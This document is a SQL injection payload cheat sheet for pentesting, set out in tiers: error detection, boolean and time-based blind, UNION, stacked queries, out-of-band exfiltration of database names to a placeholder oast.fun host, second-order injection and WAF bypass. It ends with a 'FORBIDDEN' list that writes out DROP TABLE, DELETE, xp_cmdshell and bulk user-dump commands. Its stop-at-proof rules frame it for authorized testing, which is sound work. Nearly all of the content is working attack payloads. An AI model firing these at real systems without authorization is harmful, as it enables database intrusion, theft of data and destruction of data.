# SQL Injection Payloads

Confirm injection with the least invasive method that works, then stop at proof. **Never** dump real user tables, and never run destructive DDL/DML against a live target (see FORBIDDEN below).

## Tier 1 — Error / detection
Break the query, watch for a DB error or changed behavior.
```
'
"
')
';--
' OR '1'='1
1 AND 1=1        -- true
1 AND 1=2        -- false (compare responses)
```
Fingerprint the DB from error strings (`ORA-`, `SQLSTATE`, `You have an error in your SQL syntax` = MySQL, `unterminated quoted string` = Postgres).

## Tier 2 — Boolean-blind
No error, no data — infer via true/false response diffs.
```
' AND 1=1-- -        # baseline true
' AND 1=2-- -        # false → page differs = injectable
' AND SUBSTRING(@@version,1,1)='5'-- -
' AND (SELECT 'a' FROM users LIMIT 1)='a'-- -
1) AND 1=1-- -       # bracket context
```

## Tier 2 — Time-blind
When responses don't differ. Confirm with a conditional delay; low sleep values first.
```
'; SELECT pg_sleep(5)-- -                      # Postgres
' OR SLEEP(5)-- -                              # MySQL
' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -   # MySQL, subquery form
'; WAITFOR DELAY '0:0:5'-- -                    # MSSQL
' || DBMS_LOCK.SLEEP(5)-- -                     # Oracle
```
Prove with a *conditional* delay (`IF(condition, SLEEP(5), 0)`) so it can't be a fluke.

## Tier 3 — UNION
When output is reflected. Find column count, then a string-compatible column.
```
' ORDER BY 5-- -                # increment until error → column count
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -   # SCHEMA ONLY, not data
```

## Tier 3 — Stacked queries
Only where the driver allows multiple statements (MSSQL, Postgres, some MySQL).
```
'; SELECT current_user-- -
'; SELECT version()-- -
```

## Tier 3 — OOB (out-of-band) exfil channel
When fully blind and no timing signal is reliable.
```
# MSSQL DNS
'; DECLARE @q VARCHAR(1024);SET @q='\\'+(SELECT TOP 1 name FROM sys.databases)+'.YOURID.oast.fun\x';EXEC master..xp_dirtree @q-- -
# Oracle
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('YOURID.oast.fun') FROM dual-- -
' UNION SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://YOURID.oast.fun/">%p;]>'),'/l') FROM dual-- -
```

## Second-order
Payload stored benignly (e.g. registration username), executed later in a different query (profile view, admin panel). Register `admin'-- -` style value, trigger the second sink, observe. Track where stored input is later concatenated.

## WAF bypass (excerpt — full table in ../bypass-tables.md)
```
/*!50000UNION*//*!50000SELECT*/     # MySQL inline-comment versioning
UNION/**/SELECT
%55NION %53ELECT                     # url-encode leading char
UnIoN sElEcT                         # case
'+(select 1)+'                       # concat instead of keyword
0x61646d696e                         # hex-encoded string literal
'/**/AND/**/1=1                      # comment as whitespace
```

## FORBIDDEN — never send against a live target
```
'; DROP TABLE users;--
'; DELETE FROM ...;--
'; UPDATE users SET ...;--
'; TRUNCATE ...;--
xp_cmdshell / sp_configure enabling
SELECT * FROM users            # bulk PII dump
```
These are destructive or exfiltrate real PII. Prove the vuln with boolean/time/version reads only.

## Stop when
One of: a reproducible conditional time delay, a boolean true/false response split, or reading `@@version`/`current_user`/`database()`. That proves injection. Read *one* non-sensitive value (version, current DB name) as evidence. Do not enumerate schema fully, do not touch user data. Stop.
